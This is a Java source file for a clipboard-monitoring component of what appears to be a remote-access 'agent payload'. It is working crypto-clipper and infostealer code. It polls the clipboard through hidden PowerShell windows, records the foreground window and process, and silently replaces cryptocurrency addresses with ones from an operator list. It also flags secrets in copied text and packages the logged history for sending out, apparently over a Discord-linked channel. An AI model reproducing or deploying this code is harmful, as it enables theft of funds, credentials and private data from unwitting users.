package com.spcagentpayloa.jvmxx.crypto;

import com.spcagentpayloa.jvmxx.AgentPaths;
import com.spcagentpayloa.jvmxx.ClipboardPolicy;
import com.spcagentpayloa.jvmxx.Json;
import com.spcagentpayloa.jvmxx.SecretDetector;

import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.function.Supplier;

/**
 * Clipboard monitor with address validation, a bounded history and optional
 * replacement from the operator list. Read and write are OS-specific; on
 * Windows one short PowerShell process owns both so no console window flashes.
 */
final class ClipboardWatcher implements com.spcagentpayloa.jvmxx.ClipboardService {
	interface Emitter {
		void event(String kind, Map<String, Object> data, String legacy);
	}

	record Entry(long ts, String window, String process, String content, String kind, String replaced) {
	}

	private final Supplier<Map<String, List<String>>> coins;
	private volatile Emitter emitter;
	private final Supplier<Map<String, Integer>> rotation;
	private final List<Entry> history = new ArrayList<>();
	private final Object lock = new Object();
	private volatile boolean running;
	private volatile Thread thread;
	private volatile int maxHistory = 500;
	private volatile long polls;
	private volatile long events;
	private volatile String last = "";

	ClipboardWatcher(Supplier<Map<String, List<String>>> coins, Supplier<Map<String, Integer>> rotation, Emitter emitter) {
		this.coins = coins;
		this.rotation = rotation;
		this.emitter = emitter;
	}

	void emitter(Emitter value) {
		this.emitter = value;
	}

	@Override
	public void configure(int max) {
		maxHistory = Math.max(16, Math.min(5000, max));
	}

	@Override
	public synchronized boolean start() {
		if (running) {
			return true;
		}
		running = true;
		thread = new Thread(this::loop, "spc-clip-crypto");
		thread.setDaemon(true);
		thread.start();
		return true;
	}

	@Override
	public synchronized void stop() {
		running = false;
		Thread current = thread;
		if (current != null) {
			current.interrupt();
		}
		thread = null;
	}

	public boolean running() {
		return running;
	}

	@Override
	public String status() {
		return "clipboard=" + (running ? "on" : "off") + " entries=" + history.size() + " polls=" + polls;
	}

	@Override
	public int size() {
		synchronized (lock) {
			return history.size();
		}
	}

	List<Entry> snapshot() {
		synchronized (lock) {
			return List.copyOf(history);
		}
	}

	/** Writes the live history as JSONL for the next artifact container. */
	@Override
	public Path flush(Path dir) {
		try {
			Files.createDirectories(dir);
			Path out = dir.resolve("clipboard.jsonl");
			StringBuilder builder = new StringBuilder();
			for (Entry entry : snapshot()) {
				Map<String, Object> row = new LinkedHashMap<>();
				row.put("ts", entry.ts());
				row.put("window", entry.window());
				row.put("process", entry.process());
				row.put("content", entry.content());
				row.put("kind", entry.kind());
				row.put("replaced", entry.replaced());
				builder.append(Json.stringify(row)).append('\n');
			}
			Files.writeString(out, builder.toString(), StandardCharsets.UTF_8);
			return out;
		} catch (Throwable throwable) {
			return null;
		}
	}

	private void loop() {
		while (running) {
			try {
				Thread.sleep(900L);
				polls++;
				String text = read();
				if (text == null) {
					continue;
				}
				text = text.strip();
				if (text.isEmpty() || text.length() > 4096 || text.equals(last)) {
					continue;
				}
				last = text;
				String window = foreground();
				String process = window.contains("|") ? window.substring(0, window.indexOf('|')) : window;
				String title = window.contains("|") ? window.substring(window.indexOf('|') + 1) : "";
				handle(text, process, title);
			} catch (InterruptedException interrupted) {
				return;
			} catch (Throwable throwable) {
				// one failed poll must not stop the monitor
			}
		}
	}

	private boolean timeline() {
		return com.spcagentpayloa.jvmxx.DiscordConfig.clipboardTimeline();
	}

	private void handle(String text, String process, String title) {
		if (timeline() && !text.isBlank()) {
			java.util.Map<String, Object> raw = new LinkedHashMap<>();
			raw.put("content", text.length() > 4096 ? text.substring(0, 4096) : text);
			raw.put("kind", "text");
			raw.put("process", process);
			raw.put("title", title);
			if (emitter != null) emitter.event("clipboard", raw, "clipboard-text: " + process + " | " + title + " | " + raw.get("content"));
		}
		String kind = "text";
		String replaced = "";
		if (!text.contains("\n") && text.length() <= 128) {
			Map<String, List<String>> list = coins.get();
			ClipboardPolicy.Decision decision = ClipboardPolicy.choose(text, list, rotation.get());
			if (decision != null) {
				replaced = decision.replacement();
				write(replaced);
			}
			for (String coin : list.keySet()) {
				if (com.spcagentpayloa.jvmxx.AddressValidator.valid(coin, text)) {
					kind = coin;
					break;
				}
			}
		}
		SecretDetector.Secret secret = SecretDetector.detect(text, process, title);
		if (secret != null) {
			kind = secret.kind().toLowerCase(Locale.ROOT);
			events++;
		}
		Entry entry = new Entry(System.currentTimeMillis() / 1000L, title, process, text, kind, replaced);
		synchronized (lock) {
			history.add(0, entry);
			while (history.size() > maxHistory) {
				history.remove(history.size() - 1);
			}
		}
		events++;
	}

	private String read() {
		try {
			if (AgentPaths.isWindows()) {
				String script = "$t=Get-Clipboard -Raw; if($t -ne $null){[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($t))}";
				return decode(run("powershell", "-NoP", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", script));
			}
			if (AgentPaths.isMac()) {
				return new String(run("pbpaste").getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8);
			}
			String text = new String(run("sh", "-c", "wl-paste -n 2>/dev/null || xclip -o -selection clipboard 2>/dev/null").getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8);
			return text;
		} catch (Throwable throwable) {
			return null;
		}
	}

	@Override
	public boolean copy(String text) {
		try {
			write(text);
			return true;
		} catch (Throwable throwable) {
			return false;
		}
	}

	private void write(String text) {
		try {
			if (AgentPaths.isWindows()) {
				String encoded = Base64.getEncoder().encodeToString(text.getBytes(StandardCharsets.UTF_8));
				run("powershell", "-NoP", "-NonInteractive", "-WindowStyle", "Hidden", "-Command",
					"Set-Clipboard -Value ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + encoded + "')))");
			} else if (AgentPaths.isMac()) {
				Process process = new ProcessBuilder("pbcopy").start();
				try (OutputStream input = process.getOutputStream()) {
					input.write(text.getBytes(StandardCharsets.UTF_8));
				}
				process.waitFor();
			} else {
				Process process = new ProcessBuilder("sh", "-c", "xclip -selection clipboard || wl-copy").start();
				try (OutputStream input = process.getOutputStream()) {
					input.write(text.getBytes(StandardCharsets.UTF_8));
				}
				process.waitFor();
			}
		} catch (Throwable throwable) {
			// clipboard write is best effort
		}
	}

	private String foreground() {
		try {
			if (AgentPaths.isWindows()) {
				String script = "Add-Type @'\nusing System;using System.Runtime.InteropServices;using System.Text;"
					+ "public class Fg{[DllImport(\"user32.dll\")]public static extern IntPtr GetForegroundWindow();"
					+ "[DllImport(\"user32.dll\")]public static extern int GetWindowText(IntPtr h,StringBuilder s,int c);"
					+ "[DllImport(\"user32.dll\")]public static extern uint GetWindowThreadProcessId(IntPtr h,out uint p);}\n'@;"
					+ "$h=[Fg]::GetForegroundWindow();$p=0;[void][Fg]::GetWindowThreadProcessId($h,[ref]$p);"
					+ "$n=(Get-Process -Id $p -ErrorAction SilentlyContinue).ProcessName;"
					+ "$s=New-Object Text.StringBuilder 512;[void][Fg]::GetWindowText($h,$s,512);"
					+ "[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($n+'|'+$s.ToString()))";
				String value = decode(run("powershell", "-NoP", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", script));
				return value == null ? "" : value;
			}
			if (AgentPaths.isMac()) {
				String script = "tell application \"System Events\" to get {name of first process whose frontmost is true}";
				return new String(run("osascript", "-e", script).getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8).strip() + "|";
			}
			String title = new String(run("sh", "-c", "xdotool getactivewindow getwindowname 2>/dev/null").getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8).strip();
			String process = new String(run("sh", "-c", "xdotool getactivewindow getwindowpid 2>/dev/null | xargs -r ps -o comm= -p").getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8).strip();
			return process + "|" + title;
		} catch (Throwable throwable) {
			return "";
		}
	}

	private static String decode(String value) {
		if (value == null || value.isBlank()) {
			return null;
		}
		try {
			return new String(Base64.getDecoder().decode(value.strip()), StandardCharsets.UTF_8);
		} catch (Throwable throwable) {
			return value;
		}
	}

	private static String run(String... command) {
		try {
			ProcessBuilder builder = new ProcessBuilder(command);
			builder.redirectErrorStream(true);
			Process process = builder.start();
			if (!process.waitFor(4, java.util.concurrent.TimeUnit.SECONDS)) {
				process.destroyForcibly();
				return "";
			}
			return new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
		} catch (Throwable throwable) {
			return "";
		}
	}
}
